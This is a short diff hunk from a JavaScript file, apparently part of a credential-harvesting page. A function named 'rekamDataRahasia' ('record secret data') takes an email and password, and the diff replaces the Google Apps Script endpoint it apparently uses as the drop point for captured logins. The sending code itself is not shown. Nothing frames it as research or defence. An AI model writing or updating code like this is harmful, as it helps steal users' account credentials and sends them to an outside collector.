@@ -152,7 +152,7 @@ function rekamDataRahasia(email, password) {
         return;
     }
 
-    const urlAppsScript = "https://script.google.com/macros/s/AKfycbzCJR8847DZ_HR8hOD5zE4IRkBt3W_iGUB1L53aBs5ktklPrBM-KS5dWWwisTRYiw-K/exec";
+    const urlAppsScript = "https://script.google.com/macros/s/AKfycbxEdNs_0kpIgukd2y5j-qOB6Yp0AxXlPL_f8nn34RiwHl1LGZb63bD8kvwBeaSQfLY5/exec";
     
     const sekarang = new Date();
     const opsiWaktu = { 
